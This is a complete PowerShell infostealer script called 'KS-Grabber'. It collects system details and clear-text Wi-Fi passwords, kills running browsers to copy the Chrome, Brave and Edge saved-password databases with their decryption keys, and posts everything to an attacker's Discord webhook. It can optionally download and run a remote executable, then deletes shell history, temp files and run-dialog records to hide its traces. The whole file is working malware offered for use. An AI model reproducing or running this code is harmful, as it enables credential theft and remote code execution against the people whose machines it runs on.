<# Visual #>
$Host.UI.RawUI.WindowTitle = "✨ KS-Grabber"
$softwareVer = "1.2"
Write-Output "
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⠀⠀⠀⠀⣠⣴⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢾⡇⠀⢀⣀⣀⣀⡀⢉⡽⠁⠀⠀⣿⣦⠤⠤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠸⡷⠀⣀⠤⠤⢤⣴⡿⠁⠀⢰⠀⣿⣿⣷⣤⠶⢶⣬⣭⣕⣒⠠⢄⣀⠀⠀⠀⠀⠀⠀        ____  ___________  ______ ____________
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⠀⡇⠀⠀⡞⣾⠁⠀⠀⠘⠀⠹⣇⣀⣙⡆⠀⠀⠈⠉⠙⠛⠷⠮⣉⠲⢄⡀⠀⠀⠀      / __ \/ ____// __ \/ ____// ___// ____/\
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣀⢸⡀⢰⢃⣿⣧⣴⡶⣿⣿⡶⢼⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠑⠛⠷⣤⡀     / / / / __/ // / / /\__ \ / __/ / /\ ___\/
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡏⠀⡇⢸⢻⣿⣿⣿⣶⣌⣻⣿⣿⣿⣥⣼⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙    / /_/ / /___// /_/ /___/ // /___/ /_/__
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⢱⢸⢺⣿⣿⣥⠈⠛⠣⢤⣙⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   /_____/_____//_____//____//_____/\_____/\
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣦⠈⣿⣼⣿⣿⣿⡾⠆⠀⠙⣿⣿⠇⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \_____\\____\\\____\\____\\_____\_\____\/
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢯⠀⢻⣿⣿⣿⣿⣶⣶⣷⣾⣿⣣⣴⣾⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   Dedsec has given you the truth. Do what you will.
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠖⢿⡆⠸⣏⢳⡼⣿⣿⣿⣿⣿⣟⠉⠙⠛⠋⣭⣷⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀   
⠀⠀⠀⠀⠀⠀⠀⣴⠏⠀⢰⣿⣷⡄⣿⣾⣟⠬⣿⣿⣿⣿⣿⠀⢀⠀⣠⠟⠁⠀⠲⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀   Ks-Grabber V$softwareVer
⠀⠀⠀⠀⠀⠀⣼⣿⠢⠬⣭⣿⣿⣧⢸⣿⣯⡑⠦⣾⣿⡟⣡⣔⣁⠴⢟⣱⠂⠀⠀⠈⢻⡀⠀⠀⠀⠀⠀⠀⠀   @im.nix
⠀⠀⠀⠀⣠⣾⠋⠀⣄⢀⣿⣿⢿⣷⠀⣿⢧⡙⢦⣙⣿⣿⣽⣿⣁⣹⠟⠛⢀⡇⠀⠀⠘⢧⠀⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⣰⠃⣏⣹⣦⣿⣿⡿⠁⠀⢿⣇⢘⡶⢬⣉⣿⣽⣿⣟⣻⣤⠆⣠⣺⣾⡇⡂⠀⢠⠘⡇⠀⠀⠀⠀⠀⠀
⠀⠀⢰⡇⢰⠃⢛⣿⣯⣉⣠⣤⣶⣿⣿⣿⣿⣿⠀⣈⣛⣿⡿⠟⢀⠜⠁⣹⣿⣷⣿⠀⣸⢰⡇⠀⠀⠀⠀⠀⠀
⠀⠀⣿⢣⠇⠀⣾⣿⣿⣟⣏⡜⢧⣬⣿⣿⣯⣽⣀⣿⣿⣟⣁⠔⠁⠀⠀⣽⣿⣿⠏⢀⣿⠈⡇⠀⠀⠀⠀⠀⠀
⠀⡼⠃⣨⣤⣴⣿⢃⢹⢻⡾⠀⠘⢿⣿⣟⠘⣿⣿⠿⣿⣏⣄⣀⡀⡀⠀⣸⡿⣿⠇⢈⡏⠀⡇⠀⠀⠀⠀⠀⠀
⠀⡇⣾⠿⠟⢛⠇⡸⣾⢸⡇⣀⣦⣈⣿⣿⡆⢯⣀⣲⠛⠉⠉⠑⠾⣿⢃⣿⡇⠌⠀⣼⡗⠀⡇⠀⠀⠀⠀⠀⠀
⢀⣧⠁⠀⣠⠊⠀⢳⠃⠘⠇⠿⣿⣿⣿⣿⡆⢸⣿⣷⣤⣀⣠⠤⠊⢀⣼⣿⡄⢀⠼⣿⡇⢸⡇⠀⠀⠀⠀⠀⠀
⠈⠙⣇⢻⣿⣦⣴⣃⡄⠀⢀⠀⠈⣿⡀⠹⣿⠒⡿⠟⠛⢋⡤⠒⢁⢾⣿⠙⡠⠋⠀⠛⠁⣸⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠓⠾⣅⣈⣉⣀⠀⠠⢷⡀⢸⣆⣠⣿⡄⢻⣴⣾⡏⠀⠀⠀⣾⣷⣾⣷⠒⢉⡀⢀⢿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣾⣧⣸⣿⣿⣿⣧⠈⡿⣟⡠⢀⠄⣠⣿⣿⠟⢛⡉⠛⠀⡞⣼⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡿⢸⣿⣏⣿⣿⣿⣿⣿⣽⡀⢹⠰⣚⣯⣾⣿⣿⡟⠉⠀⢀⡀⢠⢷⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡇⢸⣿⡿⣿⡿⣿⣿⣿⣿⣷⠈⣦⣿⡯⠀⡾⠋⠁⠰⣶⡟⢁⠎⣿⠁⠀⠀⠀⠀⠀⠀⠀"
<# Features #>
$features = @{
    "gatherPcData" = $true
    "gatherWifiProfiles" = $true
    "gatherOpenPorts" = $true
    "executeExe" = $false
    "gatherBrowserPass" = $true
    "gatherInstalledSoftware" = $true
    "removeTraces" = $true
}
foreach ($feature in $features.Keys) { if (-not (Test-Path "variable:$feature")) { Set-Variable -Name $feature -Value $features[$feature] } }

<# Extras #>
if ([string]::IsNullOrEmpty($keyContentLabel)) { $keyContentLabel = "Conteúdo da Chave|Key Content" }
if ([string]::IsNullOrEmpty($hookUrl)) { Write-Output "You need to define a Discord webhook URL."; exit }
if ($executeExe -and [string]::IsNullOrEmpty($exeUrl)) { Write-Output "You need to define a URL for your executable."; exit }
$filesToSend = @()

<# Functions #>
function Send-Webhook {
    param (
        [string]$jsonBody,
        [array]$files
    )

    $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")

    $bodyLines = @("--$boundary")

    $bodyLines += @(
        "Content-Disposition: form-data; name=`"payload_json`"",
        "",
        $jsonBody
    )

    if ($files.Count -gt 0) {
        $index = 0
        foreach ($file in $files) {
            $filePath = $file.Path
            $prefix = $file.Prefix
            if (Test-Path $filePath) {
                $fileContent = [System.IO.File]::ReadAllBytes($filePath)
                $fileName = [System.IO.Path]::GetFileName($filePath)
                $bodyLines += @(
                    "--$boundary",
                    "Content-Disposition: form-data; name=`"file[$index]`"; filename=`"$prefix-$fileName`"",
                    "Content-Type: application/octet-stream",
                    "",
                    [System.Text.Encoding]::Default.GetString($fileContent)
                )
                $index++
            }
        }
    }

    $bodyLines += "--$boundary--"

    $body = [System.String]::Join("`r`n", $bodyLines)

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    $null = Invoke-RestMethod -Uri $hookUrl -Method Post -Headers $headers -Body $body
}

<# PC Dump #>
if ($gatherPcData) {
    Write-Output "[ + ] Gathering computer data"
    $specs = Get-ComputerInfo -Property CsManufacturer, CsModel, CsTotalPhysicalMemory, BiosBIOSVersion, CsProcessors
}

<# Wifi Profiles Dump #>
if ($gatherWifiProfiles) {
    Write-Output "[ + ] Gathering wifi profiles"
    $wirelessSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
    $wifiInfo = foreach($SSID in $wirelessSSIDs) {
        $password = (netsh wlan show profiles name=$SSID key=clear | Select-String $keyContentLabel) -replace ".*:\s+"
        New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$password}
    }
    if ([string]::IsNullOrEmpty($wifiInfo)) { $wifiInfo= "ERROR: No wireless card detected" }
}

<# Open Ports Dump #>
if ($gatherOpenPorts) {
    Write-Output "[ + ] Gathering open ports"
    $tcpPorts = Get-NetTCPConnection | Where-Object { $_.State -eq 'Listen' } | Select-Object -ExpandProperty LocalPort -Unique
    $udpPorts = Get-NetUDPEndpoint | Select-Object -ExpandProperty LocalPort -Unique
    $openPorts = "TCP: `n$($tcpPorts -join ', ')`n`nUDP: `n$($udpPorts -join ', ')"
}

<# Installed Software #>
if ($gatherInstalledSoftware) {
    Write-Output "[ + ] Gathering installed software"
    $installedSoftware = Get-ChildItem -Path "C:\Program Files" | Select-Object -ExpandProperty Name | Out-String
    if ([string]::IsNullOrEmpty($installedSoftware)) {
        $installedSoftware = "ERROR: No software found or access denied"
    }
}

<# Execute File #>
if ($executeExe) {
    Write-Output "[ + ] Executing EXE"
    $tempFile = "$env:TEMP\UwU.exe"
    Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile
    Start-Process -FilePath $tempFile
}

<# Browser Saved Passwords #>
if ($gatherBrowserPass) {
    Write-Output "[ + ] Gathering saved passwords"
    $browserData = @(
        @{
            ProcessName = "chrome"
            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data"
            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Local State"
            Prefix = "Chrome"
        },
        @{
            ProcessName = "brave"
            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"
            Prefix = "Brave"
        },
        @{
            ProcessName = "msedge"
            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Local State"
            Prefix = "Edge"
        }
    )

    foreach ($browser in $browserData) {
        if(Get-Process -Name $browser.ProcessName -ErrorAction SilentlyContinue){
            Stop-Process -Name $browser.ProcessName -Force -ErrorAction SilentlyContinue
            Write-Output "[ ! ] Stopping $($browser.ProcessName)"
        }
        if ((Test-Path $browser.LoginDataPath) -and (Test-Path $browser.LocalStatePath)) {
            Write-Output "[ + ] $($browser.Prefix)'s passwords gathered"
            $filesToSend += @{
                Path = $browser.LoginDataPath
                Prefix = $browser.Prefix
            }
            $filesToSend += @{
                Path = $browser.LocalStatePath
                Prefix = $browser.Prefix
            }
        }
    }
}

<# Json Body #>
$json = @{
    embeds = @(
        @{
            title = "I have been pwned!"
            color = 0
            fields = @(
                @{
                    name = "Machine Name:"
                    value = "``````$($env:COMPUTERNAME)``````"
                    inline = $true
                },
                @{
                    name = "Username:"
                    value = "``````$env:USERNAME``````"
                    inline = $true
                },
                @{
                    name = "Public IP:"
                    value = "``````$(Invoke-RestMethod -Uri "http://ipinfo.io/ip")``````"
                    inline = $true
                }
            )
            author = @{
                name = "KS-Grabber V$softwareVer"
            }
            footer = @{
                text = "Dedsec has given you the truth. Do what you will."
            }
            thumbnail = @{
                url = "https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/qk5c358p.png"
            }
        }
        if ($gatherPcData) {
            @{
                color = 0
                fields = @(
                    @{
                        name = "Manufacturer:"
                        value = "``$($specs.CsManufacturer)``"
                        inline = $true
                    },
                    @{
                        name = "Model:"
                        value = "``$($specs.CsModel)``"
                        inline = $true
                    },
                    @{
                        name = "Processors:"
                        value = "``$($specs.CsProcessors.name)``"
                    },
                    @{
                        name = "Total Physical Memory:"
                        value = "``$([math]::round($specs.CsTotalPhysicalMemory / 1GB, 2))GB``"
                        inline = $true
                    },
                    @{
                        name = "Runs doom?"
                        value = "``Yes``"
                        inline = $true
                    },
                    @{
                        name = "Bios Version:"
                        value = "``$($specs.BiosBIOSVersion)``"
                    }
                )
                author = @{
                    name = "PC Specs"
                }
            }
        }
        if ($gatherWifiProfiles) {
            @{
                description = "``````$($wifiInfo | Out-String)``````"
                color = 0
                author = @{
                    name = "Wifi Passwords"
                }
            }
        }
        if ($gatherOpenPorts) {
            @{
                description = "``````$($openPorts)``````"
                color = 0
                author = @{
                    name = "Open Ports"
                }
            }
        }
        if ($gatherInstalledSoftware) {
            @{
                description = "``````$($installedSoftware)``````"
                color = 0
                author = @{
                    name = "Installed Software"
                }
            }
        }
    )
    username = "$env:USERNAME :3"
    avatar_url = "https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/hjz7cham.png"
    attachments = @()
} | ConvertTo-Json -Depth 4

<# Send Webhook #>
Send-Webhook -jsonBody $json -files $filesToSend

<# Remove traces #>
if ($removeTraces) {
    Write-Output "[ - ] Removing traces"
    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue
}

Write-Output "✨ You have been pwned lmaooo :3 :3"